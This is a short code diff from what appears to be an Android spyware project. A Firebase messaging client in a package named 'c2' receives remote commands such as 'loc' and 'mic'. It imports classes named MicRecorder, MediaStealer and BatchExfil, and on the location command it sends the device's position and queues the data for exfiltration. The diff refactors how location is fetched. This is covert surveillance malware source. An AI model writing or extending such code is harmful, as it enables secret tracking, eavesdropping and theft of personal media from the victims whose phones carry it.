@@ -3,7 +3,7 @@ package com.sp.core.c2
 import android.content.Intent
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
-import com.sp.core.services.LocationService
+import com.sp.core.services.LocationFix
 import com.sp.core.services.MicRecorder
 import com.sp.core.services.MediaStealer
 import com.sp.core.util.BatchExfil
@@ -14,7 +14,7 @@ class FirebaseClient : FirebaseMessagingService() {
         val cmd = msg.data["cmd"] ?: return
         when (cmd) {
             "loc" -> {
-                startService(Intent(this, LocationService::class.java))
+                LocationFix.send(this, immediate = true)
                 BatchExfil.enqueue(this, "loc", msg.data.toString())
             }
             "mic" -> {
